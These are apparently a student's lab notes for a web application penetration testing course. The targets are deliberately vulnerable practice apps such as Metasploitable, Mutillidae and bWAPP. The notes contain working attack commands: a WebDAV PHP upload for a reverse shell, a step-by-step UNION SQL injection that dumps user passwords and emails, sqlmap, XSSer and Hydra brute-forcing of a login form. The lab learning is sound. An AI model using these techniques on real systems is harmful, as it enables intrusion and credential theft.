# Labs

## <mark style="color:red;">Lab 1 - Web and HTTP Protocol</mark>

{% file src="../.gitbook/assets/http_methods_with_curl_walkthrough.pdf" %}
http methods walkthrough
{% endfile %}

### Practical Demonstration

{% code overflow="wrap" lineNumbers="true" %}
```bash
# for the purpose of the exam.
dirb http://$ip # bruteforce and discover directories.
curl -X GET $ip # get entire webpage.
curl --head $ip # for head request. or curl -I $ip
curl -X OPTIONS $ip -v # for OPTIONS.
curl -X POST $ip # POST request.
curl -X PUT $ip # PUT method.
curl -X OPTIONS $ip/login.php # interaction with a sub-page.
curl -X POST 192.45.178.3/login.php -d "name=john&password=password" -v # Passing the username and password to the login.php page.
curl -X OPTIONS 192.45.178.3/uploads/ -v # sneding OPTIOJNS request for /uploads/ directory.




# General Knowledge using Metasploitable 2 as Case-Study.
curl http://192.168.0.141/mutillidae/ -X GET #get request reutrns entire webpage using curl.

# 1 - HEAD
curl http://192.168.0.141/mutillidae/ -I HEAD # head request.

# 2 - upload files
# uploading file to /dav dir with curl to obtain reverse shell.
curl http://192.168.0.141/dav/ --upload-file php_code.php -v

# 3 - OPTIONS
# viewing supported http methods for the victim with curl.
curl -X 'OPTIONS' http://192.168.0.141/dav/ -v
# returns..
< Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK

```
{% endcode %}



## <mark style="color:red;">Lab 2 - Directory Enumeration with Gobuster</mark>

{% file src="../.gitbook/assets/gobuster_usage.pdf" %}

`gobuster dir -u http://192.168.0.141 -w /usr/share/wordlists/dirb/common.txt`  - dir enum.

`gobuster dir --help` - help menu.

`gobuster dir -u http://192.168.0.141 -w /usr/share/wordlists/dirb/common.txt -x .php,.xml,.txt -r` - finding specific file extension.

`-b 403,404` - blacklist/exclude these status codes.

`-x .php,.txt,.xml -r` - search for specific file extension, then `-r` to follow redirect.



## <mark style="color:red;">ZAP</mark>

{% file src="../.gitbook/assets/OWASP_ZAP_scanning_webapp.pdf" %}

## <mark style="color:red;">Lab 3 - Scanning Web Apps with Nikto</mark>

<mark style="color:red;">Best Web app Scanner................</mark>

{% file src="../.gitbook/assets/Nikto_webscan.pdf" %}

`nikto -h http://192.168.0.141` - basic scan with nikto.



## <mark style="color:red;">Passive Crawling with BurpSuite</mark>

{% file src="../.gitbook/assets/Passive_Crawling_with_BURPSUITE.pdf" %}



## <mark style="color:red;">Lab 4 - SQL Injection with SQLMap</mark>

{% file src="../.gitbook/assets/SQL_Map.pdf" %}

`sqlmap -u "http://$ip/path" --cookie "PHPSESSID=3434" -p title` -&#x20;

`sqlmap -u "http://192.183.79.3/sqli_1.php?title=helloworld&action=search" --cookie "PHPSESSID=erpn0pou57poi7dc0avcpedcc6; security_level=0" -p title` - sqlmap.

### Mannual Exploitation i did

{% code overflow="wrap" lineNumbers="true" %}
```bash
# everything must be encoded already.
# step 1
# induce an error.
title=helloworld' --  # induces a MySQL error.

# step 2
# find number of columns.
helloworld+'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+ # we have 7 columns.

# step 3
# dumping dbs/schema_names.
# dumped schema dbs -> (bWAPP,information_schema,performance_schema,mysql).
helloworld+'+UNION+SELECT+NULL,NULL,table_schema,NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.TABLES+--+&action=search      # dumps all 4 schemas/dbs in the bwapp app.

# step 4
# using the dumped schema names to get their tables.
# dumped tables for bWAPP db -> (blog,heroes,movies,users,visitors).
helloworld+'+UNION+SELECT+NULL,NULL,table_name,NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.TABLES+where+table_schema="bWAPP"+--+         

# step 5 
# get columns of each tables.
# dumped columns for users (admin,id,password,email,logon,secret..etc).
helloworld+'+UNION+SELECT+NULL,NULL,column_name,NULL,NULL,NULL,NULL+from+information_schema.columns+where+table_name='users'+--+ 

# step 6
# dumping creds.
# we are to dump admin,email and password informations only.
helloworld+'+UNION+SELECT+NULL,admin,password,NULL,email,NULL,NULL+from+bWAPP.users+--+
# or you can concat email and password together using the CONCAT() function for MySQL dbs. https://portswigger.net/web-security/sql-injection/cheat-sheet
CONCAT(password,'+<-->+',email)

# dumping bd version mannuall.
dking+'+UNION+SELECT+NULL,NULL,version(),NULL,NULL,NULL,NULL+from+information_schema.tables+--+
```
{% endcode %}



## <mark style="color:red;">Lab 5 - XSS Attack with XSSer</mark>

{% file src="../.gitbook/assets/XSSER.pdf" %}
xsser basic walkthrough.
{% endfile %}

{% file src="../.gitbook/assets/XSSER_Authenticated.pdf" %}
xsser with authenticaton.
{% endfile %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
# xsser --url "http://$ip/...?page=dns-lookup..." -p "<parameter_value>  - check for vulnerability. Replace the "search" parameter with XSS.
xsser --url 'http://192.87.202.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```
{% endcode %}

`xsser --url "http://$ip/...?page=dns-lookup..." -p "<target-host=XSS> --auto` -  checks for other vuln.. you replace your vuln parameter with "XSS".

`xsser --url "http://$ip/...?page=dns-lookup..." -p "<parameter_value> --Fp "<script>alert(1)</script>"` - to run a custom payload.

Then you can copy the payload it generates and use in Burp or ZAP to test your victim site.



## <mark style="color:red;">Lab 6 - Attacking HTTP Login with Hydra</mark>

{% file src="../.gitbook/assets/http_bruteforce_with_HYDRA.pdf" %}

`hydra -L <users.txt> -P <passwords.txt> $ip http-post-form "/login.php:login=^USER^&password=^PASS&security_level=0form=submit:<regex_Exp to not look for"` - bruteforcing http.



## <mark style="color:red;">**Attacking Basic Auth with Burp Suite**</mark>

{% file src="../.gitbook/assets/Basic_Authentication_with_BURPSUITE.pdf" %}

## <mark style="color:red;">**Attacking HTTP Login Form with ZAProxy**</mark>

{% file src="../.gitbook/assets/Http_BruteForce_with_ZAP (1).pdf" %}

